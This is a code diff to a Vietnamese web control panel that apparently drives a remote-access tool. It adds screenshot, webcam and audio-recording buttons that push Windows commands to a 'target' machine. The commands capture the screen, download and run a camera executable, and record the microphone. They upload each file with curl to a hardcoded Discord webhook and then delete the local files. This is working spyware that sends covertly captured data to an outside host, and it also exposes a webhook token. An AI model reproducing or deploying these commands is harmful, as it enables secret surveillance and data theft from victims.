@@ -123,6 +123,42 @@
         #clear-button:hover {
             background-color: #c82333;
         }
+
+        /* Styling for new action buttons */
+        #record-audio-button, #webcam-button, #screenshot-button {
+            color: #ffffff;
+            border: none;
+            padding: 8px 15px;
+            cursor: pointer;
+            font-family: 'Roboto', sans-serif;
+            font-size: 14px;
+            text-transform: uppercase;
+            border-radius: 5px;
+            transition: background-color 0.2s;
+            margin-left: 8px; /* Add some space */
+        }
+
+        #screenshot-button {
+            background-color: #007bff; /* Blue */
+        }
+        #screenshot-button:hover {
+            background-color: #0069d9;
+        }
+
+        #webcam-button {
+            background-color: #28a745; /* Green */
+        }
+        #webcam-button:hover {
+            background-color: #218838;
+        }
+
+        #record-audio-button {
+            background-color: #ffc107; /* Yellow/Orange */
+            color: #212529; /* Darker text for light background */
+        }
+        #record-audio-button:hover {
+            background-color: #e0a800;
+        }
     </style>
 </head>
 <body>
@@ -136,7 +172,12 @@
         </div>
         <div class="actions">
             <a href="index.html">&lt;&lt; Quay lại danh sách</a>
-            <button id="clear-button">Xóa lịch sử</button>
+            <div>
+                                                <button id="record-audio-button">Ghi âm</button>
+                <button id="webcam-button">Chụp ảnh Webcam</button>
+                <button id="screenshot-button">Chụp ảnh màn hình</button>
+                <button id="clear-button">Xóa lịch sử</button>
+            </div>
         </div>
     </div>
 
@@ -213,16 +254,48 @@
             // Lắng nghe kết quả mới và hiển thị (ĐÃ SỬA)
             onChildAdded(resultsRef, (snapshot) => {
                 const resultId = snapshot.key;
-                // Chỉ hiển thị nếu ID kết quả này chưa được hiển thị
                 if (!displayedResults.has(resultId)) {
                     const resultData = snapshot.val();
+                    const outputText = resultData.output || '[Không có kết quả]';
                     const outputDiv = document.createElement('div');
                     outputDiv.className = 'command-output';
-                    // Xử lý trường hợp output rỗng hoặc không tồn tại
-                    outputDiv.textContent = resultData.output || '[Không có kết quả]';
+
+                    // --- PHẦN MÃ MỚI: XỬ LÝ HIỂN THỊ ẢNH ---
+                    try {
+                        // Thử phân tích chuỗi JSON từ kết quả
+                        // Kết quả từ curl có thể chứa các dòng text thừa, ta tìm đoạn JSON
+                        const jsonMatch = outputText.match(/(\[?\{.*\}\]?)/s);
+                        if (jsonMatch) {
+                            const jsonResponse = JSON.parse(jsonMatch[1].trim());
+                            // Kiểm tra xem có phải là response từ Discord không
+                            if (jsonResponse.attachments && jsonResponse.attachments.length > 0) {
+                                const imageUrl = jsonResponse.attachments[0].url;
+                                const img = document.createElement('img');
+                                img.src = imageUrl;
+                                img.style.maxWidth = '100%';
+                                img.style.maxHeight = '400px';
+                                img.style.marginTop = '10px';
+                                img.onload = () => {
+                                    terminal.scrollTop = terminal.scrollHeight;
+                                };
+                                outputDiv.appendChild(document.createTextNode('Ảnh chụp màn hình:'));
+                                outputDiv.appendChild(img);
+                            } else {
+                                // Nếu là JSON nhưng không phải format mong muốn, hiển thị text
+                                outputDiv.textContent = outputText;
+                            }
+                        } else {
+                            // Nếu không phải JSON, hiển thị text như cũ
+                            outputDiv.textContent = outputText;
+                        }
+                    } catch (e) {
+                        // Nếu parse lỗi, chỉ hiển thị text gốc
+                        outputDiv.textContent = outputText;
+                    }
+                    // --- KẾT THÚC PHẦN MÃ MỚI ---
+
                     terminal.appendChild(outputDiv);
                     terminal.scrollTop = terminal.scrollHeight;
-                    // Đánh dấu ID kết quả này đã được hiển thị
                     displayedResults.add(resultId);
                 }
             });
@@ -231,23 +304,79 @@
             const clearButton = document.getElementById('clear-button');
             const clearHistory = () => {
                 if (confirm('Bạn có chắc muốn xóa TOÀN BỘ lịch sử lệnh cho mục tiêu này không?\nHành động này không thể hoàn tác.')) {
-                    // Xóa trên Firebase
                     remove(commandsRef);
                     remove(resultsRef);
-
-                    // Xóa hiển thị trên màn hình
                     terminal.innerHTML = '';
                     displayedCommands.clear();
                     displayedResults.clear();
-                    
-                    // Thêm một thông báo xác nhận vào terminal
                     const confirmationMsg = document.createElement('div');
-                    confirmationMsg.className = 'command-output'; // Use same style as output
+                    confirmationMsg.className = 'command-output';
                     confirmationMsg.textContent = 'Lịch sử trên Firebase và màn hình đã được xóa.';
                     terminal.appendChild(confirmationMsg);
                 }
             };
             clearButton.addEventListener('click', clearHistory);
+
+            // --- PHẦN MÃ MỚI: THÊM NÚT CHỤP ẢNH MÀN HÌNH ---
+            const screenshotButton = document.getElementById('screenshot-button');
+            const takeScreenshot = () => {
+                const commandText = "set \"WEBHOOK_URL=https://discord.com/api/webhooks/1521669348434120826/uEWqn5K2zHeVY_rZSsa9f7rl7zmwRW4cwV6F1CGBqdTlz31qPC1RHplqfyClel-KliMw\" & set \"SCREENSHOT_PATH=%temp%\\screenshot.png\" & echo [1/2] Dang chup man hinh... & powershell -NoProfile -Command \"[Reflection.Assembly]::LoadWithPartialName('System.Drawing')|Out-Null;[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')|Out-Null;$bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height);$graphics=[System.Drawing.Graphics]::FromImage($bmp);$graphics.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size);$bmp.Save('%temp%\\screenshot.png');$graphics.Dispose();$bmp.Dispose();\" & echo [2/2] Dang up len Discord... & curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@%temp%\\screenshot.png\" \"https://discord.com/api/webhooks/1521669348434120826/uEWqn5K2zHeVY_rZSsa9f7rl7zmwRW4cwV6F1CGBqdTlz31qPC1RHplqfyClel-KliMw\" & echo Xong roi! & del \"%temp%\\screenshot.png\"";
+                
+                const commandEcho = document.createElement('div');
+                commandEcho.className = 'command-echo';
+                commandEcho.textContent = `> Gửi yêu cầu chụp ảnh màn hình...`;
+                terminal.appendChild(commandEcho);
+                terminal.scrollTop = terminal.scrollHeight;
+
+                push(commandsRef, {
+                    command: commandText,
+                    timestamp: Date.now()
+                });
+            };
+            screenshotButton.addEventListener('click', takeScreenshot);
+
+            // --- PHẦN MÃ MỚI: THÊM NÚT CHỤP ẢNH WEBCAM ---
+            const webcamButton = document.getElementById('webcam-button');
+            const takeWebcamPhoto = () => {
+                const commandText = "powershell -NoProfile -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe', '%temp%\\cc.exe')\" & if exist \"%temp%\\cc.exe\" (\"%temp%\\cc.exe\" /filename \"%temp%\\cam.jpg\" /delay 500 >nul 2>&1 & curl -s -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@%temp%\\cam.jpg\" \"https://discord.com/api/webhooks/1521669348434120826/uEWqn5K2zHeVY_rZSsa9f7rl7zmwRW4cwV6F1CGBqdTlz31qPC1RHplqfyClel-KliMw\" >nul 2>&1 & del \"%temp%\\cc.exe\" \"%temp%\\cam.jpg\" >nul 2>&1)";
+                
+                const commandEcho = document.createElement('div');
+                commandEcho.className = 'command-echo';
+                commandEcho.textContent = `> Gửi yêu cầu chụp ảnh webcam...`;
+                terminal.appendChild(commandEcho);
+                terminal.scrollTop = terminal.scrollHeight;
+
+                push(commandsRef, {
+                    command: commandText,
+                    timestamp: Date.now()
+                });
+            };
+            webcamButton.addEventListener('click', takeWebcamPhoto);
+
+            // --- PHẦN MÃ MỚI: THÊM NÚT GHI ÂM ---
+            const recordAudioButton = document.getElementById('record-audio-button');
+            const recordAudio = () => {
+                const seconds = prompt("Nhập số giây bạn muốn ghi âm:", "5");
+                if (seconds && !isNaN(seconds) && parseInt(seconds) > 0) {
+                    const duration = parseInt(seconds);
+                    // Cập nhật lệnh với số giây người dùng nhập
+                    const commandText = `cmd /v:on /c "set WEBHOOK_URL=https://discord.com/api/webhooks/1521669348434120826/uEWqn5K2zHeVY_rZSsa9f7rl7zmwRW4cwV6F1CGBqdTlz31qPC1RHplqfyClel-KliMw& echo Recording for ${duration} seconds...& powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Sound { [DllImport(\\"winmm.dll\\")] public static extern long mciSendString(string command, System.Text.StringBuilder returnString, int returnLength, IntPtr hwndCallback); }'; [Sound]::mciSendString('open new type waveaudio alias recsound', $null, 0, [IntPtr]::Zero); [Sound]::mciSendString('record recsound', $null, 0, [IntPtr]::Zero); Start-Sleep -Seconds ${duration}; [Sound]::mciSendString('save recsound %TEMP%\\record.wav', $null, 0, [IntPtr]::Zero); [Sound]::mciSendString('close recsound', $null, 0, [IntPtr]::Zero);"& echo Waiting for file to save...& ping 127.0.0.1 -n 3 >nul& echo Uploading...& curl -X POST -F "file=@%TEMP%\\record.wav" !WEBHOOK_URL!& echo Done."`;
+
+                    const commandEcho = document.createElement('div');
+                    commandEcho.className = 'command-echo';
+                    commandEcho.textContent = `> Gửi yêu cầu ghi âm trong ${duration} giây...`;
+                    terminal.appendChild(commandEcho);
+                    terminal.scrollTop = terminal.scrollHeight;
+
+                    push(commandsRef, {
+                        command: commandText,
+                        timestamp: Date.now()
+                    });
+                } else {
+                    alert("Vui lòng nhập một số hợp lệ.");
+                }
+            };
+            recordAudioButton.addEventListener('click', recordAudio);
         }
     </script>
 </body>
